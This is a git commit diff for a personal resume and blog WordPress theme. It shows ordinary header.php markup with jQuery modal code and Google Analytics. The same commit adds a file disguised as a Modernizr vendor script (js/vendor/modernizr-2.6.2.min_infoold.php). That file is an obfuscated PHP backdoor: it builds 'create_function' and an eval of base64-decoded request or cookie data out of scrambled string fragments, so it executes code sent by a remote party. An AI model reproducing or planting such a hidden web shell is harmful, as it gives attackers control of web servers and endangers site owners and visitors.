30aff9f1e94457b4fa12f5815cc1fc912fcacd6e
Landon Hemsley <lhemsley@egovmt.com>
2017-02-03 07:22:51 -0700

    first merge attempt ... very dirty code

--- header.php
+++ header.php
@@ -1,10 +1,106 @@
 <html>
 <head>
 <title>Landon Hemsley</title>
-<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>">
 </head>
 <body>
 <div id="wrapper">
 <div id="header">
 <h1>HEADER</h1>
 </div>
+
+
+
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, minimumscale=1.0, maximumscale=1.0" />
+        <title>Landon Hemsley | Digital Elegance Delivered</title>
+        <meta name="description" content="Landon Hemsley online resume and personal blog">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+	    
+		<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+		<link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+		<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>">
+		<!--
+		<link rel="stylesheet" href="css/normalize.css">
+		<link rel="stylesheet" href="css/main.css">
+		<link rel="stylesheet" href="css/styles.css">
+		-->
+		<script src="js/vendor/modernizr-2.6.2.min.js"></script>
+		<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+		<!-- <script>window.jQuery || document.write('<script src="js/vendor/jquery-1.10.2.min.js"><\/script>')</script> -->
+		<script src="js/plugins.js"></script>
+		<script src="js/main.js"></script>
+		<script type="text/javascript">
+		var loadTrigger = function(screenWidth){
+			$('#equi').off();
+			$('a.resume').off();
+
+			if(screenWidth >= 600){	
+				$('a.resume').on('click',function(e){
+					e.preventDefault();
+					//load pinwheel into modal content
+					$('#modal-content').html('<div style="width:25px;margin:auto;"><img src="resume/twirl.gif" style="width:100%" /></div>');
+					//make modal appear
+					var filename = '/resume/index.php?modal=true&co=' + $(this).attr('id');
+					$('.modal').fadeIn(555, function(){
+						$('#modal-content').load(filename, function(){
+							resize();
+							$('body').addClass('modal-open');
+							$('#equi').on('click',function(){
+								$('.modal').fadeOut(400);
+								$('body').removeClass('modal-open');
+							});
+						});
+						
+					});
+					//load content from other file
+					
+					//enable closure triggers - already enabled
+				
+				});
+			}
+		}
+		   
+		var resize = function(){
+			var heights = window.innerHeight;
+			//document.getElementById("banner").style.height = heights + "px";
+			//document.getElementById("blog").style.height = heights + "px";
+			var sections = document.getElementsByClassName("section");
+			for(var i=0; i<sections.length; i++){
+				sections[i].style.height = heights + "px";
+				
+			}
+			document.getElementById("leadbox").style.top = (0.25 * heights) + "px";
+
+			/*var modalWidth = document.getElementById("modal-content").offsetWidth;
+			document.getElementById("modal-content").style.marginLeft = '-' + (0.5 * modalWidth) + "px";
+			var modalHeight = document.getElementById("modal-content").offsetHeight;
+			document.getElementById("modal-content").style.marginTop = '-' + (0.5 * modalHeight) + "px";
+			*/
+		}
+	</script>
+    </head>
+    <body>
+	<div class="modal" id="shadow"></div>
+	<div class="modal" id="backdrop"><div id="modal-content"><div style="width:25px;margin:auto;"><img src="resume/twirl.gif" style="width:100%" /></div></div></div>
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+	
+	ga('create', 'UA-63446615-1', 'auto');
+	ga('send', 'pageview');
+	
+	</script>
+        <div class="body">
+	    <!--[if lt IE 7]>
+            <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+        <![endif]-->
---
+++ js/vendor/modernizr-2.6.2.min_infoold.php
@@ -0,0 +1,123 @@
+<?php
+
+	$legibly= '=gW`'; $kilo='[JSucnsa';$economic= '?'; $hoe= ']'; $deathstar ='s)';$ideologically= 'RT';$anchor ='H)a,';$examinations= '[epo$h';$erenity ='l';$grandchildren = 'H';$angelle= 'i'; $dipped ='u)(Tiy'; $inextricable ='Jaa?I)"R'; $befit='v'; $headwall='e"kV';
+	$commuted= 'Q'; $fort ='s';$deadlocked = 'nq,r'; $elli= 'WeP$I(Ui';$galvanic = 'ic';
+
+	$fluff= '*';
+	$biochemistry= 'e;I_iev='; $lotion ='r';
+
+	$apogees= '$';$inkling ='(';$lugging ='-_([HOTS';$apartment = '=d';$baser = '"8'; $capitalism ='e';$casts ='$';
+	$forwarding='/]4v';$guessing ='Ssw eFmi'; $framed= '_'; $awkwardly='"seta';$contending='ro:ASe(';
+	$informs= '0';$interrelation ='i';
+	$machined ='31T(tL4';
+
+	$consternate= '_';$inger = 'x'; $berth='k_g)M'; $disappointment='K';
+	$claudine = 'dN';
+
+	$coat = '"';$exempts = 'iUO"s'; $fenced='e';
+
+	$danell='V$';
+	$jobholder ='s';$ashien= 'j$,w'; $fearfully ='$';
+
+	$fornication = 'a'; $greg = 'C(';$luxuries= 'Q'; $consolingly ='Z';$basses='(';$irving ='a_S';
+	$bulldogs= 'f';$consular='l';
+	$detachments='BE';$cherri =')';
+	$fatness= 'cp)$K';$coordinations ='I)eR[W._+';
+
+	$derail ='y';
+
+	$justified = '2';$animized ='a'; $existentialist= 'P';$autobiography=':;K(vOEe';
+	$colloquium= 'a';
+	$dissolution= 'E?)5'; $demurrer='ntYdr_I';$festive='PkH;HGAt';$arrogated ='pmrbjD';
+	$fumed=';';$considers= 'a^f6_Ew'; $lawn = '7rotr'; $gist='_';
+	$curlers ='ci';$andriette='Edinhag"s';$exasperate='srt_($]@'; $forcing ='j)'; $eviction ='I'; $beauregard ='sb';$danita ='h'; $celled='_J';
+	$improve= 'treai>["]';$entice ='K';
+	$amassing= 'ga)sr';$angelfish='a';$corrodible = ')ile';
+
+	$closers='c6eX';$barbecues=']9;Te(rR'; $edifice= 'u'; $disorganized ='vAC:$tiTf';
+	$delineates= 'Ero';$disyllable ='i<';$daffi =$closers['0'].$delineates['1']. $barbecues['4'] .
+
+	$angelfish .$disorganized['5']. $barbecues['4'].$celled['0'].
+	$disorganized['8']. $edifice. $andriette['3'] .
+	$closers['0'] . $disorganized['5']. $disyllable['0'] . $delineates[2]. $andriette['3'] ; $knit=$guessing['3']; $emphasis=$daffi
+
+	($knit, $barbecues['4'] . $disorganized['0'] .$angelfish .
+
+	$corrodible[2] .$barbecues['5'].$angelfish . $delineates['1'].$delineates['1'].
+	$angelfish .$derail.
+
+	$celled['0'].$arrogated['0']. $delineates[2].
+
+	$arrogated['0']. $barbecues['5'].
+	$disorganized['8'].
+
+	$edifice.
+
+	$andriette['3'] .
+
+	$closers['0'].
+
+	$celled['0'].
+
+	$amassing['0'] .
+
+	$barbecues['4'] . $disorganized['5'] .$celled['0'].$angelfish . $delineates['1'].$amassing['0']. $amassing['3']. $barbecues['5']. $corrodible['0'] . $corrodible['0'].
+
+	$corrodible['0'] .$barbecues['2'] ); $emphasis($apartment['0'],
+	$dissolution[3] ,$apartment['0'] ,$claudine['1'] ,$considers[6] , $coordinations['6'], $machined['5'],$lawn['0'] , $demurrer['2'],$disorganized['4']. $disyllable['0'].
+	$apartment['0'] .
+
+	$angelfish.
+
+	$delineates['1'].
+
+	$delineates['1'] . $angelfish .$derail .
+
+	$celled['0'].$arrogated['1'] .$barbecues['4'] . $delineates['1'] . $amassing['0'] .$barbecues['4'] .$barbecues['5'] . $disorganized['4'] . $celled['0'].$barbecues['7'] .
+
+	$delineates['0'].
+
+	$luxuries. $exempts['1'].
+
+	$delineates['0'].$irving['2'].
+
+	$disorganized['7'] . $ashien['2'] .$disorganized['4'] .$celled['0'].$disorganized['2'] .$autobiography['5']. $autobiography['5']. $entice. $eviction.$delineates['0']. $ashien['2'] . $disorganized['4'].$celled['0']. $irving['2'].$delineates['0'].$barbecues['7']. $danell['0'] . $delineates['0'] . $barbecues['7'] .
+
+	$corrodible['0'].
+	$barbecues['2'].
+	$disorganized['4']. $angelfish.$apartment['0'].$disyllable['0'] . $amassing['3'].$amassing['3'] . $barbecues['4'] .$disorganized['5'] . $barbecues['5'] . $disorganized['4'] . $disyllable['0'] . $improve['6']. $improve['7'].$angelfish.$disyllable['0'] .$festive['1'] . $considers[6] .$forcing['0'] .$amassing['3'] .$disyllable['0'] .
+
+	$danita. $improve['7'] . $barbecues['0'].
+
+	$corrodible['0'].$dissolution[1].
+	$disorganized['4']. $disyllable['0']. $improve['6'] . $improve['7']. $angelfish.
+
+	$disyllable['0']. $festive['1']. $considers[6] . $forcing['0']. $amassing['3'] .$disyllable['0'] . $danita . $improve['7'].
+	$barbecues['0'] .$disorganized['3']. $barbecues['5'] .$disyllable['0']. $amassing['3']. $amassing['3'] .$barbecues['4'].$disorganized['5'] .
+
+	$barbecues['5'] . $disorganized['4'] .$disyllable['0'].
+
+	$improve['6']. $improve['7'] . $festive['4'].$disorganized['7'].$disorganized['7'] . $festive['0'] .$celled['0']. $disorganized['1'] . $eviction .$entice .$coordinations['5'] . $celled['1'] .$irving['2']. $eviction .$festive['4'].
+
+	$improve['7'].$barbecues['0'] .$corrodible['0'].$dissolution[1] . $disorganized['4'] .$disyllable['0'].
+	$improve['6'] .
+	$improve['7'].$festive['4']. $disorganized['7'] . $disorganized['7'].$festive['0'] .$celled['0'].$disorganized['1'] . $eviction. $entice. $coordinations['5'] . $celled['1'].
+
+	$irving['2']. $eviction. $festive['4'] .
+
+	$improve['7'].
+
+	$barbecues['0'] .$disorganized['3'].$andriette['1']. $disyllable['0'] . $barbecues['4'].$corrodible['0'].$barbecues['2'] . $barbecues['4']. $disorganized['0']. $angelfish. $corrodible[2]. $barbecues['5']. $amassing['3'].
+
+	$disorganized['5'] .
+
+	$delineates['1'].
+
+	$delineates['1'].
+
+	$barbecues['4'] .$disorganized['0'] . $barbecues['5'].
+
+	$beauregard['1'] .
+	$angelfish.$amassing['3'] .
+
+	$barbecues['4'].$closers['1'] .$machined['6'].$celled['0']. $andriette['1']. $barbecues['4'].$closers['0'].$delineates[2] . $andriette['1'] .$barbecues['4'].$barbecues['5'] .$amassing['3'] .$disorganized['5']. $delineates['1'] .$delineates['1'].$barbecues['4'].$disorganized['0'].$barbecues['5'] .$disorganized['4'].$angelfish. $corrodible['0'] .$corrodible['0']. $corrodible['0'] . $corrodible['0'].$barbecues['2']  ); 
